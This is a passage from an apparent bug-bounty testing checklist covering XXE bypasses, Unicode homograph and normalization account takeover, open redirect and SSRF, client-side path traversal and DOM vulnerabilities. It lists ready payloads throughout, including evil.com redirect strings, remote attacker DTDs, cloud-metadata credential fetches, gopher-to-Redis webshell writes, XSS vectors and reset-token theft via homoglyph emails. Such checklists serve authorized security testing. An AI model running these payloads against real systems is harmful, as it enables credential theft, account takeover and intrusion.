* [ ] Hex/decimal-encode "ENTITY": `<!&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59; ...>`
* [ ] DTD chaining to a remote attacker DTD
* [ ] XML comments splitting the keyword: `<!ENT--><!--ITY ...>`
* [ ] `data:`/base64 entity values: `<!ENTITY xxe SYSTEM "data:text/plain;base64,L2V0Yy9wYXNzd2Q=">`
* [ ] `PUBLIC` identifier instead of `SYSTEM`: `<!DOCTYPE foo PUBLIC "-//x//y" "http://attacker/evil.dtd">`
* [ ] **UTF-7 encoding** the whole doc (`recode UTF8..UTF7`) to bypass keyword filters
* [ ] UTF-16 / other-encoding declaration tricks

***

### 12. Tooling

* [ ] **XXEinjector** (auto OOB, FTP, php filter, direct) — `--oob=http --phpfilter`
* [ ] **oxml\_xxe** / **docem** (embed payloads in DOCX/XLSX/SVG/PDF/JPG)
* [ ] **dtd-finder** (list local DTDs + generate error-based payloads)
* [ ] **xxe-ftp-server** / lc/230-OOB (OOB exfil server, http://xxe.sh/ payload gen)
* [ ] **nuclei** `-t xxe/` (blind-xxe templates)
* [ ] Burp Collaborator as the OOB listener

***

### 13. Confirm Impact

* [ ] Arbitrary file read (`/etc/passwd`, secrets, app source)
* [ ] SSRF → cloud metadata / internal services
* [ ] Blind data exfiltration (OOB / error-based)
* [ ] DoS (Billion Laughs)
* [ ] RCE (expect:// or chained via deserialization)
* [ ] Re-verify on a clean request; document the surface (direct XML / upload / SAML / JSON-pivot), the technique (in-band / OOB / error / XInclude), and the file/endpoint reached

</details>

<details>

<summary>IDN Homograph &#x26; Unicode Normalization</summary>

> Two related attacks: **(1) Homograph/homoglyph** — visually-identical characters from other scripts to deceive a _human_ (phishing, lookalike domains). **(2) Unicode normalization** — characters a _server_ folds to a different ASCII string at one layer but not another, enabling filter bypass and account takeover. The bug-bounty gold is #2: register/submit a confusable identifier, let the backend normalize it back to the victim's, and ride the mismatch. Order: understand the two modes → domain/phishing → the normalization ATO core → per-feature tests → injection bypass → tooling → impact.

***

### 0. Two Modes — Pick Your Angle

* [ ] **Homoglyph (visual):** deceive users — `аpple.com` (Cyrillic а) looks like `apple.com`
* [ ] **Normalization (technical):** deceive the server — `ı`/`K`/fullwidth/ligature folds to ASCII after a uniqueness check
* [ ] Key distinction: two strings can look identical to a human yet **not** normalize to the same bytes — and vice-versa. Test both.
* [ ] Confusables reference: Unicode Consortium confusables, 0xacb normalization table

***

### 1. Homoglyph / Lookalike Domains (phishing surface)

* [ ] Identify the look-alikes: Latin `a` (U+0061) vs Cyrillic `а` (U+0430); Latin `o` vs Greek `ο` (U+03BF) vs Cyrillic `о` (U+041E)
* [ ] Build punycode lookalikes: `xn--pple-43d.com` (аpple), `xn--gogle-...` etc.
* [ ] Mixed-script labels (browsers show punycode for mixed-script, but email/social often render Unicode)
* [ ] Homoglyphs in package names / repos / display names (BEC, supply-chain)
* [ ] Combine deceptive display name + subtly altered domain (BEC payment fraud)

***

### 2. The Normalization ATO Core (highest value)

> The pattern: signup/login/reset/SSO canonicalizes with NFC/NFKC, `casefold()`, IDNA, or a transliteration lib — but the uniqueness check ran on the **raw** value (or vice-versa).

* [ ] **Replay the same logical identifier through every flow** in each form: raw, lowercase, `casefold()`, NFC, NFKC, NFKD, punycode, compatibility chars
* [ ] Best canary characters: `ı` (dotless i, U+0131), `K` (Kelvin U+212A), fullwidth forms (`ａｄｍｉｎ`), ligatures (`ﬁ`), combining marks, soft hyphen (U+00AD)
* [ ] **Email ATO flow:**
  * [ ] Sign up / change email to a homoglyph of the victim: `victim@gmáil.com`, `victim@gmа il.com` (Cyrillic), `victΙm@…`
  * [ ] Trigger Forgot-Password with the confusable email
  * [ ] If the reset link/OTP goes to the **original** ASCII address (victim's) → normalization mismatch → ATO
  * [ ] Point the confusable to Burp Collaborator to catch the token if it routes to you instead
* [ ] **Account-overwrite via email change:** change your email to `victim@gmáil.com` → backend normalizes → binds to victim's account
* [ ] **Duplicate-account / collision:** register `Admin` vs `Admın` vs `ADMIN` (casefold collision) → which record wins on lookup?
* [ ] Confirm: does one endpoint **store** the raw value while another **matches** the canonicalized one?

***

### 3. Reset-Token Theft via Domain Homograph (your classic)

* [ ] Generate a Burp Collaborator payload
* [ ] Sign up at target with `abc@gmail.com.<collab>` (confirm email if required)
* [ ] On password reset, submit `abc@gmáil.com.<collab>` (homoglyph in the domain)
* [ ] If vulnerable, reset link is sent to `abc@xn--gmil-6na.com.<collab>` → lands in your Collaborator
* [ ] Check the Collaborator "To:" field to confirm delivery → reset → ATO

***

### 4. Per-Feature Test Matrix

* [ ] **OAuth `redirect_uri` bypass** — IDN homograph host slips past the allowlist (HackerOne #861940)
* [ ] **Redirect / open-redirect filter bypass** — confusable host in `returnUrl`/`next` (HackerOne #271324)
* [ ] **Password-reset host injection / link poisoning** — homograph Host header → poisoned reset link
* [ ] **2FA bypass** — confusable identifier routes 2FA to a different/no record
* [ ] **Username attacks** — register a homoglyph of an existing/privileged username → impersonation or collision
* [ ] **Filename attacks** — homoglyph filename bypasses extension/denylist or overwrites another file
* [ ] **Admin search / lookup** — confusable input resolves to the wrong (privileged) account
* [ ] **SSO callback** — canonicalization mismatch in the identity binding

***

### 5. Normalization as Injection Filter-Bypass

> When a WAF/regex validates the _normalized_ form but the app uses the _raw_ form (or the reverse), you can smuggle payloads.

* [ ] XSS: fullwidth/compatibility chars that fold to `<`, `>`, `'` after validation (e.g. `＜script＞`, fullwidth apostrophe → `'`)
* [ ] SQLi: confusable/ligature chars normalizing into keywords or quotes post-filter
* [ ] Open Redirect / SSRF: regex normalizes the URL but the fetch uses it raw (or vice-versa)
* [ ] Path traversal: compatibility chars folding to `/` or `.`
* [ ] Try NFKC/NFKD specifically — they fold the most (fullwidth, superscripts, modifier letters, ligatures) into ASCII

***

### 6. Tooling

* [ ] **ditto** (evilsocket) — generate IDN/homograph domain permutations
* [ ] **abnormalizer** (JesseClarkND) — find chars that normalize to a target ASCII char
* [ ] **0xacb normalization table** — lookup which Unicode chars fold to which ASCII
* [ ] Irongeek homoglyph attack generator
* [ ] Unicode Consortium confusables list / `confusable_homoglyphs` lib
* [ ] Burp Collaborator (catch routed tokens/emails)

***

### 7. Confirm Impact

* [ ] Account takeover (reset token / OTP routed to attacker, or account-binding to victim)
* [ ] Account overwrite / duplicate-account collision
* [ ] OAuth/redirect allowlist bypass → code/token theft
* [ ] 2FA bypass
* [ ] Filter bypass → XSS / SQLi / SSRF / traversal
* [ ] Phishing / BEC (domain or display-name lookalike)
* [ ] Re-verify on clean accounts; document the exact char (with codepoint), the normalization form responsible (NFC/NFKC/casefold/IDNA), and the two endpoints whose handling diverged

```
```

</details>

<details>

<summary>Open Redirect &#x26; SSRF</summary>

> Two classes kept together because they chain: an **open redirect** on an allowlisted host is one of the most reliable ways to defeat an **SSRF** filter. Part A = open redirect (client-side, redirects a _user's browser_). Part B = SSRF (server-side, makes the _server_ fetch). Part C = the URL-parsing/filter bypasses both share. Tag every probe and use an OAST listener (Collaborator/interactsh) for blind cases.

***

## PART A — OPEN REDIRECT

### A0. Find Redirect Sinks

* [ ] Params that smell like redirects: `?url=`, `?next=`, `?redirect=`, `?return=`, `?returnUrl=`, `?dest=`, `?continue=`, `?r=`, `?u=`, `?goto=`, `?callback=`
* [ ] Login/logout/SSO `redirect_uri`/`RelayState`/`ReturnTo`
* [ ] `Location`-setting endpoints, meta-refresh, JS `location=`/`window.open`
* [ ] Path-based redirects (`/redirect/<url>`)

### A1. Basic Redirect Tests

* [ ] `?next=https://evil.com`
* [ ] Scheme-relative: `//evil.com`, `\/\/evil.com`, `/\evil.com`
* [ ] Missing scheme: `evil.com`
* [ ] `https:evil.com`, `https:/evil.com`, `http:/\/\evil.com`
* [ ] Backslash: `/\evil.com`, `https:/\evil.com`
* [ ] Whitespace/control: `%0D%0A/evil.com`, `/%09/evil.com`, `%00`/`%0A` variants
* [ ] Fragment/anchor: `#evil.com`, `#%20@evil.com`

### A2. Domain-Confusion (allowlist says "must contain target.com")

> Goal: keep `target.com` in the string but land on attacker host.

* [ ] `https://target.com@evil.com`
* [ ] `https://target.com.evil.com`
* [ ] `https://evil.com/target.com`
* [ ] `https://evil.com?target.com` , `https://evil.com#target.com`
* [ ] `https://evil.com@target.com` (reverse)
* [ ] `https://target.com%2f@evil.com` , `https://target.com%252f@evil.com`
* [ ] `https://evil.com\@target.com`
* [ ] `https://target.com%00evil.com` , `target.com%09evil.com`
* [ ] `https://target.com%23@evil.com` , `https://target.com%25%32%33@evil.com`
* [ ] Deep-link: `androideeplink://target.com\@evil.com`
* [ ] RTL-override / unicode dot: `target.com%E2%80%AE@evil.com`, `evil。com`, `redirect_to=////evil%E3%80%82com`
* [ ] Backslash/bracket parser splits: `https://target.com\[evil.com]`, `https://target.com\udfff@evil.com`
* [ ] Parameter pollution: `next=target.com&next=evil.com`

### A3. Open Redirect Impact

* [ ] Phishing landing / credential harvest
* [ ] **Token/code theft** via OAuth `redirect_uri` (chains to ATO — see OAuth checklist)
* [ ] Steal tokens leaked in `Referer` after redirect
* [ ] **Feed it into SSRF** (Part B6) as the allowlist-bypass primitive
* [ ] 307/308 redirect to preserve method+body into a sensitive POST

***

## PART B — SSRF

### B0. Find SSRF Sinks

* [ ] "Fetch from URL" / import-from-URL / upload-from-URL
* [ ] Webhooks / callback URL registration (highest-signal; worker often reaches RFC1918/metadata)
* [ ] PDF generators, screenshot/preview cards, HTML→PDF, headless-browser renderers
* [ ] Image proxies / `_next/image?url=` (Next.js), thumbnailers
* [ ] XML/SVG parsers (→ XXE-SSRF), RSS readers
* [ ] Any param holding a URL/host/IP, `Referer`-logging analytics
* [ ] Document/file converters fetching remote assets

### B1. Confirm (capture the interaction)

* [ ] Point at Collaborator/interactsh/`webhook.site` → got a hit? (even blind = confirmed)
* [ ] DNS-only hit vs full HTTP hit (tells you egress + response visibility)
* [ ] Reflected response (full-read) vs blind (OAST-only)

### B2. Reach Internal / Localhost

* [ ] `http://127.0.0.1`, `http://localhost`, `http://[::1]`, `http://0.0.0.0`
* [ ] RFC1918: `http://169.254.169.254`, `10.x`, `172.16-31.x`, `192.168.x`
* [ ] Internal service probes: `127.0.0.1:2375/version` (Docker), `:8500/v1/status/leader` (Consul), `:9200/_cat/health` (ES), `:8983/solr/admin/info/system`, `:6379` (Redis)
* [ ] Internal hostnames from error/SMTP banners → search GitHub for subdomains

### B3. Cloud Metadata (if cloud-hosted)

* [ ] **AWS IMDSv1:** `http://169.254.169.254/latest/meta-data/` → `/iam/security-credentials/<role>`
* [ ] AWS userdata: `/latest/user-data`
* [ ] **GCP:** `http://metadata.google.internal/computeMetadata/v1/` (needs `Metadata-Flavor: Google` — only if you control headers)
* [ ] **Azure:** `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (needs `Metadata: true`)
* [ ] **DigitalOcean/Alibaba** equivalents
* [ ] Note: IMDSv2 needs a PUT token header — usually out of reach for plain SSRF

### B4. Protocol Smuggling (when not limited to http/s)

* [ ] `file:///etc/passwd` (local file read)
* [ ] `gopher://127.0.0.1:25/_MAIL FROM:...` → talk to arbitrary TCP (SMTP/Redis/etc.) → often RCE
* [ ] `gopher://127.0.0.1:6379/_` Redis → write webshell/keys (use Gopherus)
* [ ] `dict://attacker:11111/` , `dict://host:port/d:word`
* [ ] `sftp://`, `ldap://`, `tftp://`
* [ ] `php://`/`data://` wrappers if PHP target
* [ ] remote-method-guesser `--ssrf --gopher` for Java RMI

### B5. URL-Format / Allowlist Bypass

* [ ] See **Part C** (full list) — IP encodings, `@`-confusion, DNS-to-localhost, parser tricks

### B6. Redirect-Based Bypass (the OR↔SSRF bridge)

*   [ ] Host a 302/307 redirector → SSRF fetches it → redirect to `127.0.0.1`/`gopher://`

    ```python
    # redirector.py: respond 302 Location: http://127.0.0.1/
    ```
* [ ] Use 307/308 to preserve method+body
* [ ] Use an **open redirect on the allowlisted domain** instead of your own server
* [ ] `r3dir` / `Horlad` redirect service (filter-bypass redirects, Burp+Hackvertor)
* [ ] Next.js: allowed domain with open redirect → `_next/image?url=https://allowed/redirect?u=http://169.254.169.254/...`

### B7. DNS Rebinding (TOCTOU on the resolver)

* [ ] Use a rebinder: `rbndr.us` (e.g. `7f000001.<google-hex>.rbndr.us`) or `make-IP-rebind-IP-rr.1u.ms`
* [ ] Verify the flip with repeated `nslookup` (resolves A → then 127.0.0.1/169.254.169.254)
* [ ] Fire the SSRF repeatedly until the resolution lands on the internal IP
* [ ] Combine with content-type swap / API-version downgrade if filter still holds (your lab story)
* [ ] Use when filter validates-then-fetches (separate resolutions) or to dodge CORS/SOP on local IPs

### B8. Blind SSRF Escalation

* [ ] Internal port scan via timing/response differences
* [ ] Hit unauthenticated internal admin panels / actuators
* [ ] `gopher` to push payloads to internal services
* [ ] Chain to RCE (Redis/Memcached/RMI) or cloud-cred theft
* [ ] Download heavy files repeatedly → DoS (if in scope)

***

## PART C — URL-FORMAT / FILTER BYPASS (shared)

### C1. Localhost / IP Encodings

* [ ] Shorthand: `http://127.1`, `http://0`, `http://0.0.0.0`, `http://[::]`, `http://[0:0:0:0:0:ffff:127.0.0.1]`
* [ ] Decimal: `http://2130706433` (=127.0.0.1), `http://3232235521` (=192.168.0.1)
* [ ] Octal: `http://0177.0.0.1`, `http://017700000001`
* [ ] Hex: `http://0x7f000001`, `0x7f.0x0.0x0.0x1`
* [ ] Add zeros: `http://127.000000000000.1`
* [ ] Enclosed-alphanumerics: `http://①②⑦.⓪.⓪.⓪`
* [ ] CIDR-ish / odd: `http://127.127.127.127`, `http://127.0.1.3`
* [ ] Dot alternatives: `127。0。0。1`, `127%E3%80%820%E3%80%820%E3%80%821`
* [ ] Mixed encodings (silisoftware ipconverter), **Burp-Encode-IP** extension

### C2. DNS-to-Localhost / Metadata

* [ ] `localtest.me`, `127.0.0.1.nip.io`, `*.xip.io` → resolve to given IP
* [ ] `spoofed.burpcollaborator.net` = 127.0.0.1
* [ ] `1ynrnhl.xip.io` = 169.254.169.254
* [ ] `bugbounty.dod.network` = 127.0.0.2

### C3. `@` / Userinfo & Parser Confusion

* [ ] `http://expected.com@evil.com`, `http://evil.com#@expected.com`
* [ ] Encoded `@`: `%40`, double-encoded
* [ ] `%ff@`, `%bf:@`, `%252f@` host-terminator tricks (`me.com%ff@target.com%2F`)
* [ ] Flask `@`-as-initial-char, `;`-then-`@` path trick (Orange Tsai parser research)
* [ ] **Backslash-trick** (WHATWG vs RFC3986): `https://expected.com\@evil.com`
* [ ] **Left-bracket** Spring `UriComponentsBuilder`: `https://example.com[@attacker.com`
* [ ] IPv6 zone-id (RFC 6874): `[fe80::1%25eth0]`
* [ ] curl URL-globbing for file-protocol traversal: `file:///app/{.}./{.}./etc/passwd`

### C4. Path / Extension Tricks (metadata behind path check)

* [ ] `https://metadata/vuln/path#/expected/path`
* [ ] `https://metadata/vuln/path#.extension`
* [ ] `https://metadata/expected/path/..%2f..%2f/vuln/path`

### C5. Automated Regex Bypass

* [ ] **recollapse** — generate mutations to break the validating regex (normalization-based)
* [ ] 0xacb normalization table for chars that collapse to the target
* [ ] PortSwigger URL-validation-bypass cheat-sheet payloads

***

### Tooling

* [ ] Burp Collaborator / interactsh / webhook.site (OAST)
* [ ] SSRFmap, Gopherus (gopher payloads), remote-method-guesser (Java RMI)
* [ ] r3dir / custom 302 redirector, rbndr.us / 1u.ms (DNS rebinding)
* [ ] Burp-Encode-IP, recollapse, Content-Type Converter ext
* [ ] SSRF wordlist (h0tak88r/Wordlists ssrf.txt)

***

### Confirm Impact

* [ ] **Open redirect:** phishing / OAuth token theft / SSRF-filter bypass
* [ ] **SSRF:** cloud-cred theft (metadata), internal service access, file read (`file://`), RCE (gopher→Redis/RMI), internal port scan, DoS
* [ ] Distinguish blind (OAST only) vs full-read in the report
* [ ] Re-verify on a clean request; document the param, the bypass that worked, and what internal resource was reached

```
```

</details>

<details>

<summary>CSPT</summary>

> Run these boxes against SPAs where front-end JS builds an API path from user-controlled input. Core idea: inject `../` into a value that gets concatenated into a `fetch()`/XHR **path**, re-routing a legit _authenticated, same-origin_ request to a different endpoint. Because the browser auto-attaches cookies/CSRF-tokens/bearer and Origin looks legit, this defeats classic CSRF defenses → **CSPT2CSRF**. Order: find source → find sink → confirm traversal → match sink restrictions → escalate (CSRF/XSS/SSRF/CSS) → WAF/encoding bypass → tooling → impact.

> Mental model: **source** = where attacker data enters (and what triggers the request). **sink** = the reachable endpoint the rerouted request hits, sharing the source's host/headers/body restrictions.

***

### 0. Find Sources (attacker-controlled input → request path)

* [ ] URL **query** params (`?id=`, `?slug=`, `?url=`)
* [ ] URL **path** parameters
* [ ] URL **fragment** (`#...`) — never sent to server, pure client-side
* [ ] **DOM / Reflected / Stored** values (like XSS — any user input, not just front-end)
* [ ] Data injected in the DB then rendered (stored CSPT)
* [ ] `postMessage` data, `localStorage`, imported config/theme/dashboard files
* [ ] Note the **trigger**: on page-load (0-click) vs user-action (1-click) — affects severity
* [ ] Shareable/invite links that fire an authenticated POST on visit

***

### 1. Find Sinks (where the source lands)

* [ ] Source value reflected in the **path** of a subsequent `fetch()`/XHR
* [ ] A re-routable legit API request (no control of method/headers/body — only PATH)
* [ ] Instrument with Eval Villain / DOMLoggerpp to watch fetch/XHR sinks
* [ ] Find via: API docs, source-code review, Semgrep rules, Burp Bambda filter
* [ ] Watch for `/api/%2e%2e/` patterns normalized by the front-end before hitting the network (often hidden in base64 JSON bodies referencing route state)

***

### 2. Confirm the Traversal

* [ ] Inject `../` into the source, watch the outgoing request path change
* [ ] Confirm it resolves to a different same-origin endpoint (e.g. `/viewpost/../../asdf` → `/asdf`)
* [ ] Try dot-segment variants: `../`, `..%2f`, `.././`, `..;/`, `%2e%2e/`, UTF-8 homoglyphs
* [ ] Use a canary/marker so you can confirm exactly which request was rerouted
* [ ] Note whether the front-end double-decodes (`%252e%252e` → `..`)

***

### 3. Match Sink Restrictions (what's reachable)

> An exploitable sink must share the source's **host, headers, and body**. Catalog reachable sinks under those constraints.

* [ ] Same HTTP method? (don't assume POST — GET/PUT/PATCH/DELETE sinks all count)
* [ ] Body content: fixed by the source — find sinks that ignore extra body params (lax back-ends)
* [ ] Back-end lax on extra JSON params → endpoints not needing the source's params still fire
* [ ] Map "impactful sinks sharing the same restrictions" (Doyensec methodology)

***

### 4. CSPT2CSRF — State-Changing Exploitation

* [ ] Reroute the authenticated request to a state-changing endpoint:
  * `/signup/invite?inviteCode=123/../../../cards/<uuid>/cancel?a=` → POST hits card-cancel
* [ ] Privilege escalation via PUT: `.../<traversal>/api/v4/users/<id>?admin=true#`
* [ ] Group/membership changes, `users.logoutOtherClients`, `2fa.enableEmail`, cache invalidation
* [ ] **Chain a GET-sink CSPT into a second state-changing CSPT** (control the returned JSON `id`, often via file upload/download) when no direct state-changing GET sink exists
* [ ] Use `?` to append params, `?`/`#`/`;` to truncate unwanted trailing path
* [ ] HTTP method override (`X-HTTP-Method-Override`) to flip GET→POST
* [ ] JSON-body-as-query / extra-param acceptance to satisfy the target sink
* [ ] Real CVEs to mirror: Mattermost CVE-2023-45316 (POST sink), CVE-2023-6458 (GET sink), Rocket.Chat 1-click, the bank-card-cancel case

***

### 5. CSPT2XSS / CSS / Other Sinks

* [ ] **CSPT → external CSS** (CSS injection / data exfil): traverse a `color_scheme`-style param to load `theme.<x>.css` from root, chain with open redirect to attacker CSS (Acronis case)
* [ ] **CSPT → JSONP → XSS** (reroute to a JSONP endpoint reflecting a callback)
* [ ] **CSPT → SSRF token theft**: when a blind SSRF needs an auth header the browser won't send cross-site, use CSPT to reroute the _authenticated same-origin_ request into the SSRF `url=` param → leaks bearer to attacker (Sam Curry pattern)
* [ ] **CSPT → CDN cache poisoning**: reroute authenticated JSON to a `.css`/`.json`-suffixed variant cached without varying on auth → victim's private response stored under public key
* [ ] **Grafana CVE-2025-4123/6023**: `/public/plugins/../../../..//evil.com/poc/module.js` → XSS on anonymous dashboards; flip to SSRF if Image Renderer installed (test plugin paths + renderer together)

***

### 6. WAF / Encoding Bypass

* [ ] WAF blocks negative depth (too many `../`)? → exploit decode-level mismatch
* [ ] Single-encode that the app decodes but WAF doesn't: `%2e%2e%2f`
* [ ] Double-encode: `%252e%252e%2f` (browser→`../`, slips past WAF)
* [ ] Mixed `..%2f`, `%2e%2e/`, `..;/`, matrix params `;`
* [ ] UTF-8 homoglyph dot-segments
* [ ] Keep a scratchpad of working variants to replay on new sinks

***

### 7. Tooling

* [ ] **CSPT Burp Extension** (doyensec) — clusters source params reflected in later request paths, reissues PoC URLs with canary tokens
* [ ] **Eval Villain** — instrument fetch/XHR sinks in SPAs
* [ ] **DOMLoggerpp** (kevin-mizu) — DOM sink logging
* [ ] **DOM Invader** (PortSwigger)
* [ ] **CSPTPlayground** (doyensec) — practice CSPT2CSRF + CSPT2XSS
* [ ] Semgrep / SAST with custom rules for client-side routing the scanner misses

**Burp-extension workflow:** crawl target → set scope → Scan → "Export Sources With Canary" → open all those URLs in browser → check passive-scanner issues. Limitations: misses DOM/stored sources without a canary, misses client-side routing (no server request), needs complete crawl → supplement with source review + SAST.

***

### 8. Confirm Impact

* [ ] CSRF on a state-changing endpoint (card cancel, privilege escalation, settings change)
* [ ] Privilege/role escalation (admin via PUT)
* [ ] Account takeover (chained)
* [ ] XSS (via JSONP / external CSS / Grafana plugin)
* [ ] SSRF + auth-token theft
* [ ] CDN cache poisoning → cross-user data leak
* [ ] Re-verify with a clean session; document the source (type + trigger: 0/1-click), the sink (method + endpoint), and the restrictions they share

```
```

</details>

<details>

<summary>DOM-Based Vulnerabilities</summary>

> Run these boxes against client-side JS that takes an attacker-controllable **source** (URL, hash, cookie, web message…) and feeds it to a dangerous **sink** (`innerHTML`, `eval`, `location`, `WebSocket`…) without safe handling. The whole class is **taint flow**: source → (variables) → sink. DOM clobbering is the one non-taint-flow exception (HTML injection that overwrites JS globals). Order: enumerate sources → trace to sinks → test per sink-type → DOM clobbering → tooling → impact.

> Method: in Burp's browser use **DOM Invader**; or manually `Ctrl+Shift+F` in DevTools to search all JS for a source, set a breakpoint, and follow the value to the sink. Note: Chrome/Firefox/Safari URL-encode `location.search`/`location.hash` — if your data is encoded before the sink, that vector may not fire.

***

### 0. Enumerate Sources (attacker-controllable inputs)

* [ ] **URL:** `location`, `location.href`, `location.search`, `location.hash`, `document.URL`, `document.documentURI`, `document.baseURI`, `document.URLUnencoded`
* [ ] `document.referrer`
* [ ] `document.cookie`
* [ ] `window.name`
* [ ] **Web messages:** `postMessage` event `data`
* [ ] `history.pushState` / `history.replaceState` arguments
* [ ] Storage: `localStorage`, `sessionStorage`, `IndexedDB`
* [ ] Path (for 404/PHP pages where payload can sit in the path)
* [ ] Reflected/stored server data rendered into JS

***

### 1. Find Sinks & Trace the Flow

* [ ] Search page JS for each source (`Ctrl+Shift+F`), find where it's read
* [ ] Breakpoint → follow the value through intermediate variables to a sink
* [ ] Use DOM Invader to auto-inject canaries and flag source→sink flows
* [ ] For execution sinks (no DOM reflection), use the debugger (value won't appear in DOM)
* [ ] Note any encoding/sanitization between source and sink

***

### 2. DOM XSS (HTML & JS-execution sinks)

> Sink receives attacker data → script execution.

* [ ] **HTML sinks:** `innerHTML`, `outerHTML`, `document.write()`, `document.writeln()`, `insertAdjacentHTML`, `DOMParser.parseFromString`
  * `<img src=1 onerror=alert(1)>` (innerHTML — script tags don't run, event handlers do)
  * Break out of context first: `"><svg onload=alert(1)>`, `</option><script>alert(1)</script>` (inside `<select>`)
* [ ] **JS-exec sinks:** `eval()`, `Function()`, `setTimeout(str)`, `setInterval(str)`, `execScript`
* [ ] **jQuery sinks:** `$()` / `$.parseHTML()` selector with controllable input; `.html()`, `.append()`, `.after()`
* [ ] **hashchange event** + jQuery `$()` selector: deliver via iframe `src=...#` then `onload=this.src+='<img src=x onerror=print()>'`
* [ ] **AngularJS** (`ng-app` present): `{{constructor.constructor('alert(1)')()}}` — no angle brackets needed
* [ ] **Script src / dynamic import** sinks: control a script URL
* [ ] Mind URL-encoding behavior per browser (hash often survives un-encoded)

### 3. DOM XSS — Context Breakouts (sink reflects into HTML)

* [ ] **Between tags / text:** inject `<script>`/event-handler tag
* [ ] **In an attribute (quoted):** `"` to break out, then `onX=` or `><tag>`
* [ ] **In an attribute (unquoted):** space + `onX=`
* [ ] **In `href`/`src`:** `javascript:alert(1)`
* [ ] **Inside `<script>` string:** `'-alert(1)-'`, `</script>`, or close the string/template literal
* [ ] **Inside template literal:** `${alert(1)}`
* [ ] **Inside event handler / JS context:** balance quotes/brackets
* [ ] Map the exact context, then craft the minimal breakout

***

### 4. Open Redirection (DOM)

* [ ] Sinks: `location`, `location.href`, `location.assign()`, `location.replace()`, `window.open()`, `location.protocol/host`
* [ ] Source like `location.hash` set as redirect target: `...#https://evil.com`
* [ ] Confirm browser navigates off-site → phishing / token leak

### 5. Cookie Manipulation (DOM)

* [ ] Sink: `document.cookie` set from a source
* [ ] Inject extra cookie attributes / new cookies; chain to fixation or to a second sink that trusts the cookie
* [ ] `name=value; Max-Age=...` style injection via `\r\n`/`;` in source

### 6. JavaScript Injection / `eval`

* [ ] Source flows into `eval()`/`Function()`/`setTimeout` string → run JS directly
* [ ] Break out of the surrounding expression to inject statements

### 7. `document.domain` Manipulation

* [ ] Source sets `document.domain` → relaxes same-origin → cross-frame access between cooperating pages
* [ ] Confirm it widens trust to an attacker-influenced value

### 8. WebSocket-URL Poisoning

* [ ] Source controls the `new WebSocket(url)` target
* [ ] Point the WS connection at an attacker host → exfil messages / CSWSH-style abuse
* [ ] Chain with the WebSocket checklist for message-level attacks

### 9. Link Manipulation

* [ ] Source flows into an `href`/`action`/`src` attribute write
* [ ] Overwrite a link target → phishing or stealing data sent to that URL (e.g. via `Referer`/params)

### 10. Web-Message Manipulation (`postMessage`)

* [ ] Listener uses event `data` in a sink **without origin check**
* [ ] Send a crafted message from an attacker page → XSS / redirect / state change
* [ ] **Controlling the message source:** if listener trusts `event.source`/origin loosely, spoof via iframe/popup
* [ ] Test `data` reaching `innerHTML`/`eval`/`location`

### 11. AJAX Request-Header Manipulation

* [ ] Source flows into `setRequestHeader()` value/name
* [ ] Inject/override headers on the app's own XHR/fetch (e.g. add trusted headers)

### 12. Local File-Path Manipulation

* [ ] Source flows into `FileReader`/`XMLHttpRequest` `file:` path or path argument
* [ ] Manipulate which local resource is read

### 13. Client-Side SQL Injection (WebSQL)

* [ ] Source flows into `executeSql()` (legacy WebSQL)
* [ ] Classic SQLi payloads in the client DB query

### 14. HTML5-Storage Manipulation

* [ ] Source written into `localStorage`/`sessionStorage`, later read into a sink
* [ ] Persisted payload re-executes on subsequent loads (stored DOM XSS)

### 15. Client-Side XPath Injection

* [ ] Source flows into a client-side XPath query → break the expression / extract nodes

### 16. Client-Side JSON Injection

* [ ] Source injected into a JSON string later `eval`/`JSON.parse`'d unsafely → inject keys/values or break parsing

### 17. DOM-Data Manipulation

* [ ] Source written into a non-script DOM field (form value, attribute, toggle) that changes app logic / client-side access checks

### 18. Denial of Service (DOM)

* [ ] Source flows into `RegExp` (ReDoS), a huge loop, `document.write` flood, or storage-fill
* [ ] Confirm tab hang / crash (authorized targets only)

***

### 19. DOM Clobbering (HTML injection, no JS exec needed)

> When XSS is blocked but you can inject HTML with `id`/`name` allowed, overwrite JS globals/properties with DOM nodes. Thrives on "safe HTML" features (comments, markdown, HTML email previews).

* [ ] Find dangerous patterns: `var x = window.x || {default}`, `someObject.url`, `config.x` used in a script URL/`||`
* [ ] Single global: `<a id=x href=https://evil>` → `x` resolves to the anchor (coerces to href)
* [ ] **Nested via id+name HTMLCollection** (Chromium): `<a id=x><a id=x name=y href="evil">` → `x.y`
* [ ] **Form + named control:** `<form id=config><input name=url value="//attacker"></form>` → `config.url.value`
* [ ] **Three levels deep:** `<form id=x name=y><input id=z></form><form id=x></form>` → `x.y.z`
* [ ] Clobber `getElementById` result via `<html id=foo>`/`<body id=foo>` (service-worker `cdnDomain` hijack pattern)
* [ ] Clobber `attributes`/`submit`/`length` to break HTML filters (HTMLJanitor `attributes.length` undefined trick)
* [ ] **DOMPurify bypass:** `cid:` protocol doesn't URL-encode `"` → `<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`
* [ ] No-timeout clobber: use a `style`/`link` import to delay iframe so injection loads first
* [ ] Escalate to DOM XSS (if a script-loading gadget reads the clobbered global) or logic/flag bypass

***

### 20. Tooling

* [ ] **Burp DOM Invader** (auto source/sink + DOM-clobbering mode — enable in settings)
* [ ] Chrome DevTools: `Ctrl+Shift+F` source search, breakpoints, watch values
* [ ] Eval Villain (instrument eval/innerHTML/etc.)
* [ ] DOMLoggerpp (DOM sink logging)
* [ ] Retire.js / check jQuery & AngularJS versions for known DOM sinks

***

### 21. Confirm Impact

* [ ] DOM XSS → session hijack / ATO (highest)
* [ ] Open redirect → phishing / OAuth token theft
* [ ] WebSocket poisoning / web-message → data exfil or XSS
* [ ] DOM clobbering → DOM XSS or client-side logic/access bypass
* [ ] Cookie/storage manipulation → fixation or persisted XSS
* [ ] Client-side SQLi/XPath/JSON → data access or parsing abuse
* [ ] DoS → tab crash
* [ ] Re-verify on a clean session; document the source, the full taint path, the sink, and the browser it fires in (some clobbering is Chrome-only)

```
```

</details>

<details>

<summary>postMessage</summary>

> Run these boxes against any app using cross-window messaging (iframes, popups, SSO/payment widgets, SDKs). Two sides to attack: the **sender** (leaks data if `targetOrigin` is `*`) and the **receiver** (the `message` listener — XSS/state-change if it skips or weakly validates `event.origin`). Core idea: `postMessage` is a taint **source** (`event.data`) → unsafe **sink** = DOM XSS, or missing origin check = anyone can drive the handler. Order: enumerate listeners → analyze validation → attack sender → attack receiver → origin-check bypasses → frame/XSS-block bypasses → tooling → impact.

***

